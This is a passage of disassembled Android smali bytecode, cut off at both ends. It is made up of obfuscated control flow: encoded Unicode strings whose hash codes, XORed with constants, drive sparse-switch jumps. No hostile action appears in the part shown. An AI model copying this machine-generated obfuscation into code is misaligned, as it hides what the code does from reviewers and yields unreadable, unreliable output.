    const-string v0, "\u06da\u06ec\u06e1\u06d6\u06eb\u06e8\u06d8\u06e0\u06da\u06d9\u06d6\u06e6\u06e5\u06da\u06e0\u06d6\u06d9\u06dc\u06e5\u06d8\u06eb\u06d9\u06db\u06e2\u06db\u06db\u06e2\u06d8\u06e1\u06eb\u06d7\u06d8\u06df\u06e8\u06eb\u06df\u06d6\u06d9\u06e4\u06df\u06e8\u06e8\u06dc\u06e5\u06d8\u06e7\u06e5\u06db\u06db\u06d6\u06d8"
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_11

    :sswitch_3c
    const-string v0, "\u06df\u06e1\u06e7\u06da\u06e7\u06e5\u06e8\u06eb\u06e2\u06e1\u06df\u06e6\u06e7\u06eb\u06d8\u06d8\u06d8\u06d8\u06e0\u06d9\u06d9\u06db\u06df\u06e5\u06e8\u06e8\u06d6\u06e5\u06d8\u06e8\u06d9\u06e0\u06e4\u06e1\u06d7\u06e6\u06dc\u06e5\u06d8\u06e5\u06d8\u06d8\u06df\u06e1\u06e6\u06d8\u06d9\u06e8\u06e5\u06d8\u06e6\u06e6\u06dc\u06eb\u06d9\u06e5\u06d8\u06d8\u06e2\u06da"

    goto/16 :goto_11

    :catch_0
    move-exception v0

    const/4 v0, 0x0

    goto :goto_12

    :sswitch_3d
    const-string v1, "\u06e1\u06d7\u06dc\u06d8\u06e7\u06d9\u06e5\u06da\u06d9\u06dc\u06d8\u06e1\u06da\u06e6\u06da\u06d8\u06dc\u06e5\u06e2\u06da\u06e4\u06ec\u06e7\u06d8\u06e2\u06ec\u06da\u06e5\u06e4\u06e4\u06e1\u06e5\u06e8\u06d6\u06e8\u06d6\u06eb\u06e0\u06ec\u06e2\u06e4\u06da\u06e8\u06d6\u06d9\u06e2\u06da\u06e8\u06e0"

    goto :goto_13

    :sswitch_3e
    const v12, -0x6dd49e5e

    const-string v1, "\u06d6\u06eb\u06d6\u06da\u06d6\u06e2\u06d9\u06e5\u06e8\u06d8\u06ec\u06e5\u06e1\u06d8\u06db\u06da\u06d6\u06d8\u06e0\u06e0\u06e2\u06d9\u06e4\u06e8\u06d8\u06df\u06df\u06e6\u06e5\u06e8\u06dc\u06d8\u06e8\u06db\u06e0\u06dc\u06db\u06da\u06d6\u06d8\u06e0\u06da\u06d9\u06dc\u06eb\u06d7\u06db\u06d8\u06da\u06ec\u06dc\u06e6\u06d8\u06e4\u06da\u06e4\u06e2\u06e6\u06e7\u06d8"

    :goto_16
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v12

    sparse-switch v13, :sswitch_data_14

    goto :goto_16

    :sswitch_3f
    const-string v1, "\u06e8\u06d7\u06dc\u06d8\u06e8\u06ec\u06e5\u06d8\u06e0\u06e6\u06d8\u06d8\u06e8\u06db\u06eb\u06e2\u06e2\u06e5\u06e0\u06e0\u06e4\u06eb\u06d6\u06e8\u06d8\u06df\u06dc\u06e0\u06d8\u06e8\u06e5\u06e6\u06d6\u06e0\u06d8\u06ec\u06e6\u06df\u06e5\u06d6\u06d9\u06d7\u06d8\u06d8\u06e0\u06da\u06e4"

    goto :goto_16

    :cond_8
    const-string v1, "\u06da\u06e8\u06e7\u06e4\u06dc\u06d7\u06e6\u06da\u06d8\u06da\u06e4\u06e1\u06db\u06e0\u06ec\u06e6\u06d7\u06e0\u06e1\u06d9\u06db\u06eb\u06d8\u06e8\u06dc\u06e6\u06e1\u06e0\u06db\u06eb\u06dc\u06db\u06e4\u06e1\u06dc\u06ec\u06db\u06e7\u06e5\u06d8\u06e4\u06e8\u06e0\u06da\u06e8\u06d8\u06e4\u06e1\u06e2\u06e7\u06e1\u06e8\u06e5\u06e6\u06dc\u06d8"

    goto :goto_16

    :sswitch_40
    if-nez v8, :cond_8

    const-string v1, "\u06e7\u06e6\u06dc\u06d8\u06e4\u06d8\u06e4\u06e8\u06e8\u06e7\u06da\u06d9\u06db\u06e2\u06df\u06e4\u06e4\u06db\u06e4\u06e5\u06e7\u06d6\u06e1\u06e1\u06e7\u06ec\u06d6\u06e7\u06d8\u06e2\u06e8\u06e2\u06ec\u06d8\u06e7\u06e4\u06e7\u06e5\u06d8\u06e5\u06d8\u06e6\u06e1\u06ec\u06e7\u06d9\u06d8\u06d8\u06df\u06e2\u06e0"

    goto :goto_16

    :sswitch_41
    const-string v1, "\u06e1\u06e2\u06dc\u06d8\u06df\u06d9\u06dc\u06d8\u06da\u06da\u06d7\u06e8\u06db\u06e0\u06d8\u06e2\u06e2\u06e1\u06d8\u06e1\u06d9\u06e0\u06ec\u06e4\u06da\u06e8\u06d8\u06e7\u06d6\u06e2\u06dc\u06ec\u06e8\u06e6\u06e8\u06e2\u06e6\u06e8\u06e8\u06e4\u06e6\u06e0\u06d6\u06d6\u06d8\u06d9\u06e5\u06e1\u06d9\u06db\u06d7"

    goto :goto_13

    :sswitch_42
    const-string v1, "\u06e8\u06e1\u06e7\u06e2\u06e5\u06e8\u06db\u06da\u06d6\u06dc\u06dc\u06e5\u06e7\u06e5\u06ec\u06da\u06d8\u06e0\u06e0\u06db\u06dc\u06ec\u06eb\u06d8\u06e2\u06d6\u06e0\u06e6\u06e7\u06dc\u06eb\u06e8\u06e6\u06d8\u06dc\u06dc\u06dc\u06ec\u06df\u06d6\u06d8\u06e7\u06d8"

    goto :goto_13

    :sswitch_43
    const v11, -0x48980d9b

    const-string v1, "\u06d7\u06e6\u06df\u06e8\u06e6\u06da\u06df\u06d7\u06e1\u06e6\u06ec\u06e7\u06df\u06d9\u06e1\u06e2\u06e7\u06dc\u06d8\u06df\u06d9\u06ec\u06e5\u06ec\u06e6\u06d8\u06e6\u06ec\u06e6\u06ec\u06e0\u06d6\u06e6\u06da\u06d8\u06d8\u06d7\u06e5\u06d9\u06d8\u06db\u06e6\u06d8\u06eb\u06e6\u06e6\u06dc\u06e1\u06e6\u06e1\u06e6\u06d8\u06d8\u06e0\u06dc\u06da\u06d7\u06ec\u06e5"

    :goto_17
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_15

    goto :goto_17

    :sswitch_44
    const v12, 0x1b415a80

    const-string v1, "\u06e1\u06e5\u06e4\u06da\u06e1\u06d9\u06e4\u06e5\u06e7\u06eb\u06d7\u06df\u06dc\u06e8\u06da\u06d9\u06d9\u06e1\u06d9\u06e7\u06e1\u06d8\u06da\u06e0\u06e8\u06d8\u06e0\u06d9\u06da\u06df\u06e6\u06d8\u06e5\u06ec\u06ec\u06d7\u06e7\u06e8\u06e7\u06d6\u06e6\u06d8\u06e7\u06da\u06df"

    :goto_18
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v12

    sparse-switch v13, :sswitch_data_16

    goto :goto_18

    :sswitch_45
    if-nez v0, :cond_9

    const-string v1, "\u06d7\u06d7\u06db\u06e1\u06e1\u06e0\u06d8\u06dc\u06e6\u06e2\u06e2\u06df\u06e5\u06e6\u06d8\u06e1\u06e2\u06d7\u06da\u06d8\u06e5\u06d8\u06e5\u06e0\u06ec\u06e4\u06d7\u06d8\u06d8\u06e4\u06db\u06e1\u06e8\u06dc\u06d7\u06df\u06da\u06e2\u06e5\u06e1\u06d7\u06ec\u06e2\u06dc\u06e1\u06e6\u06e1\u06df\u06dc\u06e7"

    goto :goto_18

    :sswitch_46
    const-string v1, "\u06dc\u06e4\u06df\u06dc\u06dc\u06d8\u06d8\u06e8\u06eb\u06d7\u06ec\u06e6\u06e5\u06e8\u06da\u06e1\u06d8\u06da\u06d9\u06d8\u06e8\u06da\u06dc\u06e5\u06e4\u06e1\u06d8\u06e2\u06e0\u06dc\u06d8\u06e0\u06e8\u06e6\u06d8\u06d8\u06e7\u06d6\u06d8\u06e2\u06eb\u06eb"

    goto :goto_17

    :cond_9
    const-string v1, "\u06e4\u06e4\u06e1\u06d8\u06e4\u06e8\u06da\u06ec\u06d6\u06e8\u06da\u06e1\u06d6\u06e7\u06d6\u06e8\u06d8\u06d7\u06e8\u06e0\u06e0\u06d9\u06d6\u06d8\u06ec\u06df\u06eb\u06dc\u06df\u06e6\u06e5\u06db\u06df\u06e5\u06db\u06e8\u06d8\u06e7\u06e4\u06e0\u06d6\u06d9\u06dc\u06e7\u06e2\u06e0"

    goto :goto_18

    :sswitch_47
    const-string v1, "\u06e6\u06dc\u06da\u06d7\u06dc\u06e1\u06d8\u06e8\u06e7\u06e8\u06d8\u06d8\u06e5\u06ec\u06da\u06df\u06e4\u06d9\u06e5\u06d7\u06d6\u06e0\u06e6\u06e6\u06df\u06da\u06e2\u06d6\u06d8\u06e6\u06dc\u06e2\u06e1\u06e5\u06e1\u06dc\u06db\u06df\u06ec\u06e8\u06d8\u06d6\u06e8\u06e6\u06e6\u06e8\u06e5\u06e8\u06d8\u06e4\u06e6\u06d8\u06d8\u06df\u06e6\u06e7"

    goto :goto_18

    :sswitch_48
    const-string v1, "\u06df\u06d6\u06e8\u06d8\u06df\u06e4\u06e4\u06e6\u06ec\u06e1\u06d8\u06e6\u06e7\u06e5\u06d8\u06eb\u06e1\u06e8\u06d8\u06da\u06d9\u06db\u06dc\u06e8\u06e7\u06d8\u06d8\u06e5\u06d8\u06eb\u06e0\u06d6\u06db\u06e0"

    goto :goto_17

    :sswitch_49
    const-string v1, "\u06e0\u06d6\u06e8\u06d8\u06d7\u06e4\u06d8\u06dc\u06e6\u06e1\u06e7\u06e8\u06e8\u06d8\u06dc\u06e2\u06dc\u06e0\u06e6\u06d9\u06e0\u06ec\u06e8\u06e7\u06e7\u06eb\u06dc\u06d9\u06ec\u06e4\u06d6\u06d8"

    goto :goto_17

    :sswitch_4a
    const-string v1, "\u06db\u06eb\u06e5\u06d8\u06e0\u06d9\u06e8\u06d9\u06db\u06db\u06eb\u06e8\u06e8\u06d8\u06e6\u06e8\u06e8\u06e0\u06da\u06da\u06e7\u06e1\u06d8\u06e1\u06e6\u06d8\u06e1\u06d6\u06d8\u06db\u06e0\u06ec"

    goto/16 :goto_14

    :sswitch_4b
    const v12, 0x58a6aa3f

    const-string v1, "\u06ec\u06da\u06e4\u06e6\u06e1\u06e8\u06db\u06e4\u06ec\u06d8\u06e0\u06e8\u06e0\u06e6\u06e5\u06d8\u06db\u06d7\u06df\u06da\u06eb\u06d8\u06d8\u06e5\u06e2\u06e6\u06d8\u06dc\u06da\u06dc\u06d8\u06e1\u06e0\u06e7\u06e1\u06ec\u06d8\u06d8\u06e8\u06d8\u06d8\u06d7\u06e1\u06d6\u06d8\u06e6\u06d7\u06e6\u06d8\u06df\u06e4\u06d6\u06d9\u06e6\u06d7"

    :goto_19
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v12

    sparse-switch v13, :sswitch_data_17

    goto :goto_19

    :sswitch_4c
    const/4 v1, 0x1

    if-ne v8, v1, :cond_a

    const-string v1, "\u06e1\u06d7\u06db\u06e5\u06df\u06d9\u06eb\u06da\u06d7\u06df\u06e1\u06d6\u06ec\u06e8\u06dc\u06dc\u06ec\u06e6\u06d8\u06d6\u06d6\u06d8\u06d8\u06db\u06e5\u06d6\u06d8\u06e4\u06e7\u06dc\u06d8\u06ec\u06e2\u06e8\u06d8\u06e1\u06e0\u06e6\u06d8\u06e8\u06d8\u06d9"

    goto :goto_19

    :cond_a
    const-string v1, "\u06e2\u06d8\u06e6\u06dc\u06e0\u06d6\u06e1\u06e8\u06db\u06df\u06e6\u06e7\u06d8\u06e1\u06df\u06df\u06d7\u06e7\u06e6\u06d8\u06e2\u06ec\u06d7\u06d8\u06d8\u06db\u06eb\u06d8\u06e8\u06d7\u06db\u06e6\u06d9\u06e0\u06e7\u06df\u06e7\u06e8\u06d8\u06e5\u06e4\u06df\u06eb\u06da\u06e1\u06dc\u06df\u06da\u06dc\u06e4\u06db\u06e4\u06e7\u06e0\u06d7\u06e4\u06e6\u06d8"

    goto :goto_19

    :sswitch_4d
    const-string v1, "\u06ec\u06df\u06d9\u06e2\u06ec\u06e8\u06d8\u06e0\u06e0\u06da\u06e5\u06d8\u06dc\u06d8\u06df\u06e1\u06d7\u06e5\u06e4\u06e8\u06ec\u06e7\u06e0\u06e8\u06e8\u06d7\u06ec\u06e7\u06ec\u06e0\u06e8\u06d8\u06e0\u06dc\u06ec\u06d8\u06df\u06e6\u06e8\u06d8\u06e4\u06d8\u06d8\u06da\u06e4\u06e1\u06d8\u06e8\u06d9\u06d6"

    goto :goto_19

    :sswitch_4e
    const-string v1, "\u06d7\u06d8\u06e7\u06d8\u06e7\u06da\u06e6\u06e0\u06e7\u06da\u06d6\u06e6\u06d8\u06d7\u06d9\u06d7\u06eb\u06e8\u06e1\u06e1\u06e4\u06dc\u06d8\u06e8\u06e4\u06d6\u06d8\u06e4\u06dc\u06e7\u06d8\u06e2\u06df\u06e2\u06e2\u06df\u06df\u06e0\u06e7\u06e1\u06e7\u06e5\u06e8\u06d6\u06eb\u06e5\u06df\u06db\u06e0\u06d8\u06d7\u06e8\u06d8\u06e0\u06e7\u06e4\u06d6\u06d6\u06e5"

    goto/16 :goto_14

    :sswitch_4f
    const v8, -0x3ef91688    # -8.431999f

    const-string v1, "\u06d7\u06df\u06e8\u06e6\u06e6\u06e1\u06da\u06df\u06d6\u06e6\u06d8\u06eb\u06df\u06e1\u06d7\u06da\u06d8\u06d7\u06e7\u06d7\u06e1\u06d8\u06d8\u06d9\u06dc\u06d8\u06d8\u06df\u06eb\u06df\u06eb\u06da\u06da\u06ec\u06e6\u06d8\u06d9\u06d7\u06e0\u06dc\u06dc\u06d6\u06e6\u06e7\u06d8\u06d8\u06e1\u06e6\u06e5\u06e6\u06e8\u06d8\u06da\u06d7\u06eb\u06da\u06eb\u06e5"

    :goto_1a
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v8

    sparse-switch v11, :sswitch_data_18

    goto :goto_1a

    :sswitch_50
    const v11, 0x6c88b4a4

    const-string v1, "\u06e6\u06d7\u06eb\u06d7\u06d6\u06db\u06dc\u06e2\u06d6\u06d8\u06dc\u06e4\u06df\u06e1\u06ec\u06da\u06e6\u06e8\u06da\u06e8\u06d6\u06e8\u06d8\u06dc\u06e8\u06e4\u06e5\u06e8\u06d6\u06d8\u06ec\u06dc\u06da\u06dc\u06eb\u06e0\u06da\u06d6\u06ec\u06e7\u06df\u06e4\u06df\u06df\u06e7"

    :goto_1b
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_19

    goto :goto_1b

    :sswitch_51
    const-string v1, "\u06da\u06e4\u06dc\u06d7\u06e4\u06e1\u06d8\u06d9\u06e4\u06e2\u06e8\u06e6\u06d6\u06d8\u06d9\u06dc\u06e7\u06dc\u06d9\u06e2\u06e6\u06dc\u06d9\u06e6\u06e8\u06e5\u06e0\u06d8\u06e1\u06e1\u06e2\u06dc\u06d8\u06e1\u06e8\u06e5\u06e4\u06da\u06e4\u06e1\u06df\u06d9\u06e8\u06ec\u06df\u06d9\u06e7\u06e8\u06d9\u06e4\u06e0\u06e2\u06e1\u06e4\u06e0\u06d7"

    goto :goto_1a

    :cond_b
    const-string v1, "\u06ec\u06df\u06d9\u06df\u06eb\u06e8\u06ec\u06d9\u06ec\u06e1\u06e1\u06e7\u06e8\u06e5\u06d8\u06e0\u06d6\u06db\u06e1\u06e4\u06e6\u06d8\u06df\u06da\u06e5\u06d6\u06da\u06e1\u06d8\u06df\u06da\u06e6\u06db\u06ec\u06e6\u06d8\u06e1\u06e0\u06dc\u06e7\u06e2\u06d8\u06e7\u06e7\u06ec\u06e8\u06d9\u06d8\u06d8\u06d8\u06e6\u06d9\u06e4\u06dc\u06e7\u06d8\u06e5\u06e7\u06e1\u06d8"

    goto :goto_1b

    :sswitch_52
    if-nez v0, :cond_b

    const-string v1, "\u06d9\u06e5\u06e1\u06d8\u06e0\u06da\u06ec\u06e2\u06d6\u06df\u06e2\u06ec\u06d6\u06d8\u06e2\u06d9\u06e8\u06d6\u06da\u06e2\u06d8\u06e1\u06d8\u06d8\u06df\u06df\u06d6\u06d7\u06d8\u06e8\u06d8\u06d6\u06e0\u06dc\u06d8\u06eb\u06dc\u06e4\u06e2\u06dc\u06d7\u06d6\u06d6\u06e4\u06e5\u06da\u06e8\u06d8\u06d9\u06db\u06e5\u06df\u06e5\u06d8\u06db\u06ec\u06e8\u06d8\u06db\u06ec\u06db"

    goto :goto_1b

    :sswitch_53
    const-string v1, "\u06e2\u06d6\u06e1\u06d8\u06db\u06e7\u06df\u06e5\u06e7\u06e1\u06e7\u06e2\u06d6\u06d8\u06d9\u06df\u06dc\u06e4\u06da\u06dc\u06e1\u06d9\u06e6\u06d8\u06e8\u06db\u06eb\u06db\u06d6\u06e2\u06df\u06e0\u06dc\u06d8"

    goto :goto_1b

    :sswitch_54
    const-string v1, "\u06eb\u06d9\u06eb\u06e5\u06e4\u06e1\u06d8\u06da\u06dc\u06ec\u06e8\u06da\u06e6\u06e2\u06dc\u06e8\u06d8\u06d6\u06ec\u06eb\u06dc\u06e4\u06e0\u06e1\u06ec\u06e5\u06d8\u06da\u06dc\u06e1\u06e8\u06e6\u06e6\u06e5\u06e6\u06da\u06e4\u06d8\u06ec\u06e7\u06d8\u06d9\u06e7\u06e2\u06d8\u06e6\u06e8\u06eb\u06da\u06d7"

    goto :goto_1a

    :sswitch_55
    const-string v1, "\u06e4\u06e6\u06e8\u06d8\u06da\u06eb\u06eb\u06e1\u06e2\u06d8\u06dc\u06e0\u06dc\u06d8\u06eb\u06da\u06df\u06db\u06ec\u06e2\u06e0\u06db\u06ec\u06d9\u06df\u06df\u06d9\u06e6\u06e8\u06d8\u06e5\u06db\u06d6\u06dc\u06d7\u06da\u06e8\u06e4\u06d7"

    goto :goto_1a

    :sswitch_56
    const v1, -0x5da0fb00

    const-string v0, "\u06ec\u06ec\u06e5\u06e1\u06d7\u06e4\u06eb\u06e2\u06d9\u06e1\u06e7\u06e1\u06ec\u06e8\u06eb\u06e4\u06d9\u06e1\u06eb\u06ec\u06db\u06e4\u06e4\u06da\u06d7\u06e1\u06e6\u06e4\u06ec\u06e1\u06d8"

    :goto_1c
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v1

    sparse-switch v8, :sswitch_data_1a

    goto :goto_1c

    :sswitch_57
    const v1, 0x141d04a2

    const-string v0, "\u06e8\u06e5\u06eb\u06e8\u06d7\u06d8\u06d8\u06df\u06e7\u06df\u06e8\u06db\u06da\u06d6\u06e1\u06e6\u06d8\u06dc\u06e2\u06e5\u06d8\u06da\u06e4\u06db\u06e6\u06df\u06e8\u06dc\u06e6\u06dc\u06d8\u06dc\u06dc\u06e1\u06dc\u06e1\u06e2\u06e4\u06dc\u06d6\u06d8\u06ec\u06e6\u06d9\u06e2\u06dc\u06eb\u06e8\u06e6\u06d8\u06e2\u06e8\u06e6\u06d8\u06db\u06da\u06db"

    :goto_1d
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v1

    sparse-switch v8, :sswitch_data_1b

    goto :goto_1d

    :sswitch_58
    const-string v0, "\u06da\u06d6\u06e0\u06dc\u06d6\u06dc\u06d8\u06dc\u06eb\u06d7\u06d9\u06d7\u06d8\u06d8\u06e4\u06df\u06ec\u06e2\u06dc\u06e1\u06d8\u06d7\u06dc\u06e5\u06d8\u06e8\u06dc\u06d8\u06d8\u06d9\u06e4\u06e6\u06d8\u06d8\u06d7\u06e6\u06d8\u06d7\u06d7\u06e5\u06e8\u06ec\u06e4\u06ec\u06dc\u06d6\u06d7\u06da\u06ec\u06d6\u06e5\u06e8\u06df"

    goto :goto_1d

    :sswitch_59
    const-string v0, "\u06e8\u06df\u06e6\u06d8\u06d7\u06da\u06ec\u06d9\u06e6\u06e5\u06d8\u06eb\u06df\u06d6\u06d8\u06dc\u06d8\u06d9\u06d8\u06e0\u06e1\u06d8\u06d9\u06e1\u06e6\u06da\u06db\u06e6\u06da\u06e8\u06e8\u06e5\u06dc\u06e6\u06d6\u06d8\u06e8\u06da\u06e5\u06d6"

    goto :goto_1c

    :sswitch_5a
    const v8, 0x3b98b231

    const-string v0, "\u06e7\u06e8\u06e4\u06db\u06d6\u06da\u06da\u06df\u06df\u06ec\u06eb\u06db\u06e2\u06e0\u06e1\u06e5\u06e0\u06e5\u06e6\u06e6\u06d9\u06d6\u06e7\u06e6\u06d8\u06d6\u06d8\u06e6\u06ec\u06da\u06e6\u06d8\u06d7\u06e6\u06ec\u06e7\u06d6\u06d8\u06d8\u06d7\u06da\u06e7\u06e1\u06e0\u06dc\u06d8\u06da\u06e6\u06e2\u06d7\u06d7\u06e2\u06e8\u06dc\u06e2\u06e0\u06dc\u06d8"

    :goto_1e
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v8

    sparse-switch v11, :sswitch_data_1c

    goto :goto_1e

    :sswitch_5b
    if-eqz v9, :cond_c

    const-string v0, "\u06df\u06e0\u06e0\u06e6\u06e0\u06e7\u06eb\u06e8\u06e5\u06e0\u06e7\u06e8\u06e5\u06ec\u06e1\u06d8\u06d8\u06e4\u06dc\u06d9\u06e1\u06d6\u06d8\u06ec\u06df\u06e1\u06eb\u06e4\u06d8\u06d8\u06e8\u06e0\u06d7\u06ec\u06e7\u06e8\u06d7\u06d8\u06db\u06d9\u06e0\u06e6\u06eb\u06ec\u06dc\u06d8\u06d6\u06d9\u06d8\u06e5\u06db\u06e4\u06dc\u06d8\u06da\u06db\u06e4\u06d7"

    goto :goto_1e

    :cond_c
    const-string v0, "\u06e7\u06e5\u06dc\u06e7\u06e7\u06e8\u06d8\u06db\u06eb\u06e1\u06d8\u06e7\u06db\u06dc\u06d8\u06db\u06d8\u06e8\u06d8\u06e5\u06d9\u06da\u06da\u06dc\u06e1\u06d8\u06ec\u06e2\u06e2\u06e7\u06d7\u06e1\u06d8\u06e2\u06e5\u06e1\u06d8\u06df\u06e4\u06eb\u06df\u06eb\u06e1\u06e1\u06d9\u06d8\u06d9\u06e0\u06d7\u06db\u06e6\u06d6\u06e7\u06d7\u06df"

    goto :goto_1e

    :sswitch_5c
    const-string v0, "\u06eb\u06d8\u06d8\u06ec\u06ec\u06e8\u06d8\u06e2\u06e5\u06e6\u06e5\u06d8\u06e7\u06d8\u06e1\u06df\u06dc\u06d8\u06e6\u06e1\u06e6\u06d8\u06d9\u06e8\u06dc\u06d8\u06da\u06d7\u06d6\u06d8\u06e7\u06e5\u06e5\u06e8\u06eb\u06e5\u06d8\u06e1\u06d7\u06e5\u06e0\u06e5\u06e5\u06d8\u06db\u06eb\u06e6\u06d8\u06e7\u06d7\u06d6\u06d7\u06d6\u06d8\u06da\u06e1\u06ec"

    goto :goto_1e

    :sswitch_5d
    const-string v0, "\u06d8\u06e1\u06d6\u06e7\u06d7\u06e1\u06d8\u06df\u06d6\u06e6\u06d8\u06e2\u06ec\u06d8\u06e4\u06e6\u06e6\u06d8\u06df\u06e2\u06d6\u06d8\u06d9\u06eb\u06ec\u06e8\u06d7\u06db\u06e6\u06db\u06da\u06da\u06e2\u06e8\u06d8"

    goto :goto_1c

    :sswitch_5e
    const-string v0, "\u06d6\u06df\u06e4\u06df\u06e7\u06e1\u06da\u06eb\u06e5\u06d8\u06ec\u06e0\u06d8\u06d8\u06eb\u06e4\u06e4\u06e4\u06e5\u06e6\u06d8\u06e5\u06e7\u06df\u06e2\u06e5\u06dc\u06d8\u06dc\u06d9\u06d7\u06e5\u06e0\u06e8\u06d8\u06e6\u06dc\u06e6\u06d8\u06e7\u06da\u06e2"

    goto :goto_1c

    :sswitch_5f
    const-string v0, "\u06d9\u06d9\u06d6\u06df\u06e6\u06e6\u06e2\u06e8\u06e1\u06d8\u06da\u06e2\u06e8\u06d8\u06e0\u06e4\u06e1\u06d8\u06ec\u06e1\u06e8\u06d8\u06e2\u06e8\u06d6\u06db\u06e8\u06e5\u06e5\u06e4\u06d8\u06d8\u06dc\u06e7\u06d8\u06d8\u06e5\u06d9\u06eb\u06dc\u06e4\u06e7"

    goto :goto_1d

    :sswitch_60
    const v8, 0x38ebafc7

    const-string v0, "\u06e4\u06df\u06d8\u06d6\u06e0\u06e5\u06e2\u06ec\u06e4\u06e1\u06da\u06d6\u06d8\u06dc\u06e7\u06df\u06db\u06e4\u06e6\u06d6\u06d6\u06d9\u06da\u06e4\u06e8\u06d8\u06d9\u06e6\u06e7\u06d8\u06e6\u06d8\u06d6\u06d8\u06df\u06df\u06e8\u06d8\u06e1\u06e5\u06e1\u06da\u06e0\u06e1\u06d8\u06eb\u06d9\u06e0\u06db\u06e4\u06dc\u06d8\u06da\u06e2\u06d6"

    :goto_1f
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v11

    xor-int/2addr v11, v8

    sparse-switch v11, :sswitch_data_1d

    goto :goto_1f

    :sswitch_61
    const-string v0, "\u06d8\u06e6\u06e6\u06e1\u06ec\u06e1\u06db\u06ec\u06e6\u06d8\u06e4\u06d6\u06df\u06e8\u06e2\u06d9\u06e6\u06df\u06d8\u06e0\u06ec\u06e2\u06e6\u06e1\u06dc\u06d8\u06e1\u06e1\u06e2\u06df\u06d7\u06eb\u06df\u06e2\u06dc\u06d8\u06d6\u06df\u06d7\u06e2\u06d8\u06d7\u06e0\u06db\u06e1\u06e1\u06d9\u06df\u06e6\u06eb\u06d9\u06d8\u06d9\u06e6\u06e1\u06e7\u06dc\u06d8"

    goto :goto_1d

    :cond_d
    const-string v0, "\u06d9\u06d7\u06db\u06ec\u06d8\u06e5\u06d8\u06dc\u06dc\u06da\u06ec\u06da\u06d8\u06d8\u06e0\u06da\u06d6\u06dc\u06d8\u06e5\u06d8\u06db\u06e6\u06e5\u06df\u06eb\u06e8\u06d6\u06da\u06db\u06e8\u06e8\u06d8\u06e1\u06d6\u06d8\u06d8\u06d9\u06db\u06e0\u06ec\u06d7\u06e5\u06d7\u06d7\u06e1\u06d8\u06d9\u06e2\u06db\u06eb\u06e1\u06e4\u06d9\u06e1\u06e1\u06d8\u06d8\u06e5\u06e5"

    goto :goto_1f

    :sswitch_62
    const/4 v0, 0x1

    if-eq v9, v0, :cond_d

    const-string v0, "\u06da\u06e0\u06d6\u06d8\u06da\u06dc\u06e8\u06d8\u06d9\u06d9\u06e1\u06d8\u06e5\u06db\u06e6\u06d8\u06dc\u06d6\u06d6\u06e0\u06ec\u06e5\u06e1\u06ec\u06e6\u06d8\u06e4\u06e6\u06da\u06e6\u06e2\u06e6\u06d8\u06e7\u06dc\u06e7\u06eb\u06d6\u06e6\u06d8\u06e4\u06d7\u06e5\u06d8\u06e5\u06d6\u06d9\u06e6\u06eb"

    goto :goto_1f

    :sswitch_63
    const-string v0, "\u06e0\u06e6\u06df\u06df\u06ec\u06db\u06e6\u06e5\u06e4\u06e1\u06e5\u06e2\u06e8\u06d9\u06d9\u06e8\u06e7\u06d6\u06d8\u06e4\u06e4\u06d7\u06eb\u06e6\u06e7\u06d8\u06e4\u06ec\u06e6\u06d7\u06d7\u06d8\u06da\u06d8\u06ec\u06ec\u06eb\u06eb\u06df\u06df\u06e1\u06e2\u06e7\u06e5\u06d8\u06e2\u06e2\u06ec\u06e5\u06e8\u06e6\u06d8\u06e2\u06d9\u06e2\u06dc\u06e1\u06e8"

    goto :goto_1f

    :sswitch_64
    const v1, -0x60b8d617

    const-string v0, "\u06e6\u06e8\u06e7\u06e6\u06e0\u06ec\u06d7\u06e1\u06da\u06dc\u06d7\u06e4\u06da\u06e8\u06e1\u06e8\u06d8\u06e7\u06d8\u06df\u06d7\u06d8\u06d8\u06eb\u06df\u06e8\u06d8\u06db\u06e0\u06d6\u06e0\u06e6\u06d9\u06e1\u06ec\u06e6\u06d6\u06d9\u06e7\u06d7\u06ec\u06e2\u06e6\u06d8\u06d8\u06d7\u06d8\u06db\u06e5\u06e0\u06da\u06eb\u06d9\u06dc\u06d9\u06d8\u06e8\u06d8"

    :goto_20
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v1

    sparse-switch v8, :sswitch_data_1e

    goto :goto_20

    :sswitch_65
    const-string v0, "\u06e1\u06d8\u06e4\u06eb\u06e4\u06d8\u06dc\u06e6\u06e7\u06d9\u06df\u06e1\u06d8\u06e4\u06df\u06d6\u06d8\u06db\u06da\u06d9\u06d8\u06e2\u06e8\u06d8\u06d8\u06df\u06e0\u06da\u06dc\u06e4\u06e2\u06e0\u06e7\u06d6\u06d9\u06d8\u06d6\u06d6\u06dc\u06d8\u06e8\u06e0\u06d6\u06d8\u06db\u06eb\u06dc\u06d6\u06d9\u06e7\u06e6\u06df\u06e5\u06d8\u06d6\u06e6\u06e8\u06d8\u06db\u06e2\u06e8\u06d8"

    goto :goto_20

    :sswitch_66
    const-string v0, "\u06db\u06dc\u06e2\u06e5\u06ec\u06e1\u06d8\u06e5\u06e6\u06e1\u06df\u06e6\u06dc\u06d8\u06e6\u06d7\u06e5\u06e0\u06e1\u06e1\u06d8\u06e0\u06e6\u06df\u06dc\u06d7\u06d7\u06d6\u06d9\u06d9\u06e7\u06da\u06e1\u06df\u06e7\u06dc\u06e5\u06e7\u06e7\u06e4\u06da\u06e1\u06dc\u06d9\u06e5\u06d8"

    goto :goto_20

    :sswitch_67
    const v8, -0x5f2fa9d3

